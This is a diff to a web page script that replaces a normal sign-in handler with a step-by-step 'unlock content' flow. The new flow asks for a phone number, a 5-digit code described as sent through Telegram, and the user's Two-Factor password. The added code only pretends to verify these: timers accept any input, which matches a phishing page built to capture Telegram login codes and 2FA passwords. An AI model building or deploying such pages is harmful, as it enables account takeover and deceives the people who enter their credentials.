-            showMessage("Signed in successfully. Redirecting...", "success");
-
-            window.location.assign(
-                typeof result.redirect === "string" &&
-                result.redirect.startsWith("/") &&
-                !result.redirect.startsWith("//")
-                    ? result.redirect
-                    : "/dashboard"
-            );
-        } else {
-            showMessage(
-                result.message || "Sign-in unsuccessful. Please try again.",
-                "error"
-            );
-        }
-
-    } catch (error) {
-        showMessage(
-            "Unable to connect to the server. Please try again shortly.",
-            "error"
-        );
-    } finally {
-        submitBtn.disabled = false;
-        buttonText.textContent = "Sign in securely";
+  inp.addEventListener("keydown", e => {
+    if(e.key === "Backspace" && !inp.value && i > 0){
+      e.preventDefault();
+      otpInputs[i-1].value = "";
+      otpInputs[i-1].classList.remove("filled");
+      otpInputs[i-1].focus();
     }
-});
-</script>
+    if(e.key === "ArrowLeft"  && i > 0) otpInputs[i-1].focus();
+    if(e.key === "ArrowRight" && i < otpInputs.length - 1) otpInputs[i+1].focus();
+  });
 
+  inp.addEventListener("paste", e => {
+    e.preventDefault();
+    const digits = (e.clipboardData.getData("text") || "").replace(/\D/g,"").split("");
+    digits.forEach((d, k) => {
+      if(otpInputs[i+k]){ otpInputs[i+k].value = d; otpInputs[i+k].classList.add("filled"); }
+    });
+    otpInputs[Math.min(i + digits.length, otpInputs.length - 1)].focus();
+  });
+});
+
+/* ==================== STEP 2 : VERIFY ==================== */
+let codeVerified = false;
+
+function verifyCode(){
+  const btn = document.getElementById("verifyBtn");
+  const status2 = document.getElementById("status2");
+  const code = otpInputs.map(i => i.value).join("");
+  const pwGroup = document.getElementById("passwordGroup");
+  const pw = document.getElementById("password");
+
+  /* --- phase 1: verify the OTP, then reveal 2FA --- */
+  if(!codeVerified){
+    if(code.length < otpInputs.length){
+      setStatus(status2, "⚠️ Enter the complete 5-digit code from Telegram.", "error");
+      const empty = otpInputs.find(i => !i.value);
+      if(empty) empty.focus();
+      return;
+    }
+    withLoading(btn, "Verifying code…");
+    setTimeout(() => {
+      stopLoading(btn);
+      codeVerified = true;
+      pwGroup.classList.remove("hidden");
+      setStatus(status2, "🔓 Code verified! Now enter your Two-Factor password to finish unlocking.", "info");
+      btn.innerHTML = "Unlock Content";
+      setTimeout(() => pw.focus(), 260);
+    }, 1000);
+    return;
+  }
+
+  /* --- phase 2: verify the 2FA password --- */
+  if(!pw.value.trim()){
+    setStatus(status2, "⚠️ Please enter your Two-Factor password.", "error");
+    pw.focus();
+    return;
+  }
+  withLoading(btn, "Unlocking…");
+  setTimeout(() => {
+    stopLoading(btn);
+    goStep(3);
+  }, 1100);
+}
+
+/* ==================== RESETS ==================== */
+function backToStep1(){
+  otpInputs.forEach(i => { i.value = ""; i.classList.remove("filled"); });
+  document.getElementById("password").value = "";
+  document.getElementById("passwordGroup").classList.add("hidden");
+  codeVerified = false;
+  document.getElementById("verifyBtn").innerHTML = "Unlock Content";
+  setStatus(document.getElementById("status1"),
+    "🔐 Enter your phone number with country code. A secure verification code will be sent to your Telegram app.", "info");
+  goStep(1);
+}
+
+function resetAll(){
+  document.getElementById("phone").value = "";
+  backToStep1();
+  goStep(0);
+}
+</script>
 </body>
 </html>
